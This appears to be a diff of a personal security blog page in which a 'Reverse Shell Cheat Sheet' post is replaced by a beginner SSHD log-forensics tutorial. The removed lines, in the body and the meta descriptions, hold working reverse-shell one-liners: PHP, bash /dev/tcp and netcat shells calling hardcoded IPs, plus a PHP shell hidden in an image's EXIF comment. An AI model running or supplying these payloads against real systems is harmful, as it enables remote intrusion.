@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en-us">
   <head>
-    <title>Reverse Shell Cheat Sheet // Fl1x&#39;s Blog</title>
+    <title>SSHD Parser Forensics // Fl1x&#39;s Blog</title>
     <link rel="shortcut icon" href="/favicon.png" />
     <meta charset="utf-8" />
     <meta name="generator" content="Hugo 0.92.2" />
@@ -12,17 +12,21 @@
 
     
     <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Reverse Shell Cheat Sheet"/>
-<meta name="twitter:description" content="PHP  Oneliner  php -r &#39;$sock=fsockopen(&#34;172.16.1.1&#34;,4445);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;  Same using URL encoding  php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.1%22%2C4445%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 &lt;?php exec(&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;&amp;1&#39;&#34;);  Reverse-shell payload Windows  https://github.com/Dhayalanb/windows-php-reverse-shell
-Netcat nc 172.16.1.1 4545 -e /bin/sh mknod /tmp/backpipe p /bin/sh 0&lt;/tmp/backpipe | nc 172.16.1.1 4444 1&gt;/tmp/backpipe Bash bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1 Exif of a file with php exiftool -Comment=&#39;&lt;?php $sock = fsockopen(&#34;&lt;IPADDRESS&gt;&#34;,&lt;PORT&gt;);$proc = proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes); ?"/>
+<meta name="twitter:title" content="SSHD Parser Forensics"/>
+<meta name="twitter:description" content="Introduction In this article, we will see how to analyze SSHD (SSH server-side) logs with basic command-line tools &ldquo;grep, cat, wc, head, tail, awk&rdquo; to potentially find any suspicious requests on our SSH server.
+By default, we have the SSHD logs in /var/log/auth.log . This file contains not only SSHD logs but also CRON, PAM logs.
+Basic Log stats First, we can perform basic stats on our log file:
+ Number of log entries First and last entry   Number of log entries We started with basic print number of lines in the log file with the &ldquo;wc&rdquo; command."/>
 
-    <meta property="og:title" content="Reverse Shell Cheat Sheet" />
-<meta property="og:description" content="PHP  Oneliner  php -r &#39;$sock=fsockopen(&#34;172.16.1.1&#34;,4445);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;  Same using URL encoding  php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.1%22%2C4445%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 &lt;?php exec(&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;&amp;1&#39;&#34;);  Reverse-shell payload Windows  https://github.com/Dhayalanb/windows-php-reverse-shell
-Netcat nc 172.16.1.1 4545 -e /bin/sh mknod /tmp/backpipe p /bin/sh 0&lt;/tmp/backpipe | nc 172.16.1.1 4444 1&gt;/tmp/backpipe Bash bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1 Exif of a file with php exiftool -Comment=&#39;&lt;?php $sock = fsockopen(&#34;&lt;IPADDRESS&gt;&#34;,&lt;PORT&gt;);$proc = proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes); ?" />
+    <meta property="og:title" content="SSHD Parser Forensics" />
+<meta property="og:description" content="Introduction In this article, we will see how to analyze SSHD (SSH server-side) logs with basic command-line tools &ldquo;grep, cat, wc, head, tail, awk&rdquo; to potentially find any suspicious requests on our SSH server.
+By default, we have the SSHD logs in /var/log/auth.log . This file contains not only SSHD logs but also CRON, PAM logs.
+Basic Log stats First, we can perform basic stats on our log file:
+ Number of log entries First and last entry   Number of log entries We started with basic print number of lines in the log file with the &ldquo;wc&rdquo; command." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://fl1xh.github.io/posts/reverse_shell_cheat_sheet/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-03-16T14:34:07+01:00" />
-<meta property="article:modified_time" content="2022-03-16T14:34:07+01:00" />
+<meta property="og:url" content="https://fl1xh.github.io/posts/sshd_parser_forensics/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-28T11:05:32+02:00" />
+<meta property="article:modified_time" content="2022-03-28T11:05:32+02:00" />
 
 
 
@@ -100,14 +104,14 @@ Netcat nc 172.16.1.1 4545 -e /bin/sh mknod /tmp/backpipe p /bin/sh 0&lt;/tmp/bac
       
   <article class="post">
     <header class="post-header">
-      <h1 class ="post-title">Reverse Shell Cheat Sheet</h1>
+      <h1 class ="post-title">SSHD Parser Forensics</h1>
       <div class="post-meta">
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
   <title>calendar</title>
   <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
 </svg>
-          Mar 16, 2022
+          Mar 28, 2022
         </div>
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
@@ -121,36 +125,38 @@ Netcat nc 172.16.1.1 4545 -e /bin/sh mknod /tmp/backpipe p /bin/sh 0&lt;/tmp/bac
   <title>tag</title>
   <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
 </svg>
-              <a class="tag" href="https://fl1xh.github.io/tags/redteam/">RedTeam</a>
+              <a class="tag" href="https://fl1xh.github.io/tags/blueteam/">BlueTeam</a>
               <a class="tag" href="https://fl1xh.github.io/tags/cheat-sheet/">Cheat-Sheet</a>
         </div>
       </div>
     </header>
     <div class="post-content">
-      <h2 id="php">PHP</h2>
+      <h2 id="introduction">Introduction</h2>
+<p>In this article, we will see how to analyze SSHD (SSH server-side) logs with basic command-line tools &ldquo;<code>grep</code>, <code>cat</code>, <code>wc</code>, <code>head</code>, <code>tail</code>, <code>awk</code>&rdquo; to potentially find any suspicious requests on our SSH server.</p>
+<p>By default, we have the SSHD logs in <code>/var/log/auth.log</code> . This file contains not only SSHD logs but also CRON, PAM logs.</p>
+<h2 id="basic-log-stats">Basic Log stats</h2>
+<p>First, we can perform basic stats on our log file:</p>
 <ul>
-<li>Oneliner</li>
+<li>Number of log entries</li>
+<li>First and last entry</li>
+<li></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php -r <span style="color:#00afaf">&#39;$sock=fsockopen(&#34;172.16.1.1&#34;,4445);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
-</code></pre></div><ul>
-<li>Same using URL encoding</li>
+<h3 id="number-of-log-entries">Number of log entries</h3>
+<p>We started with basic print number of lines in the log file with the &ldquo;<code>wc</code>&rdquo; command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat auth.log | wc -l
+<span style="color:#00afaf">276</span>
+</code></pre></div><p>On my home server, there is only 276 log entries but on a server accessible from the Internet, there will be much more amount of data, especially if the ssh port is open.</p>
+<p>print first and last line</p>
+<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat auth.log | awk <span style="color:#00afaf">&#39;NR==1; END{print}&#39;</span>
+</code></pre></div><p>grep sshd log</p>
+<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat auth.log | grep <span style="color:#00afaf">&#34;sshd&#34;</span> | awk <span style="color:#00afaf">&#39;NR==1; END{print}&#39;</span>
+</code></pre></div><p>You can now practice with this good challenge on the BTLO platform: <a href="https://blueteamlabs.online/home/challenge/17">https://blueteamlabs.online/home/challenge/17</a> (active challenge, don&rsquo;t post any write-ups)</p>
+<p>Sources:</p>
+<ul>
+<li>My knowledge</li>
+<li><a href="https://redgreenrepeat.com/2017/02/17/parsing-ssh-logs-basics/">https://redgreenrepeat.com/2017/02/17/parsing-ssh-logs-basics/</a></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.1%22%2C4445%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;?php
-exec(<span style="color:#00afaf">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;&amp;1&#39;&#34;</span>);
-</code></pre></div><ul>
-<li>Reverse-shell payload Windows</li>
-</ul>
-<p><a href="https://github.com/Dhayalanb/windows-php-reverse-shell">https://github.com/Dhayalanb/windows-php-reverse-shell</a></p>
-<h2 id="netcat">Netcat</h2>
-<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 172.16.1.1 <span style="color:#00afaf">4545</span> -e /bin/sh
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mknod /tmp/backpipe p
-/bin/sh 0&lt;/tmp/backpipe | nc 172.16.1.1 <span style="color:#00afaf">4444</span> 1&gt;/tmp/backpipe
-</code></pre></div><h2 id="bash">Bash</h2>
-<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;<span style="color:#00afaf">1</span>
-</code></pre></div><h2 id="exif-of-a-file-with-php">Exif of a file with php</h2>
-<div class="highlight"><pre tabindex="0" style="color:#8a8a8a;background-color:#1c1c1c;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">exiftool -Comment=<span style="color:#00afaf">&#39;&lt;?php $sock = fsockopen(&#34;&lt;IPADDRESS&gt;&#34;,&lt;PORT&gt;);$proc = proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes); ?&gt;&#39;</span> &lt;IMAGE&gt;
-</code></pre></div>
+
     </div>
     <div class="post-footer">
       
